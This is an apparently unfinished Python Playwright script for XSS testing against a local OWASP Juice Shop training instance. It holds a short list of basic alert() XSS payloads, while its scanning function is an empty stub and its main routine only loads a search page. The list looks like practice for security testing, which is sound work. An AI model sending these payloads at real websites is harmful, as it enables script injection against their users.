import asyncio
from playwright.async_api import async_playwright
import urllib.parse

# Configuration
TARGET_BASE = "http://localhost:3000"  # Change to your Juice Shop instance IP/Port
SEARCH_ENDPOINT = f"{TARGET_BASE}/#/search?q="

# A mix of basic and Juice Shop specific XSS payloads
PAYLOADS = [
    "<script>alert(1)</script>",
    "<iframe src=\"javascript:alert(`xss`)\">",
    "<img src=x onerror=alert(1)>",
    "</script><script>alert(1)</script>"
]

def xss_scan(context, payload):
    encoded_payload = urllib.parse.quote(payload)
    volnerable = False
    

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        # The 'await' keyword tells Python to let other tasks run 
        # while waiting for the browser network to settle
        await page.goto("http://localhost:3000/#/search?q=test")
        print(await page.title())
        
        await browser.close()

if __name__ == "__main__":
    asyncio.run(main())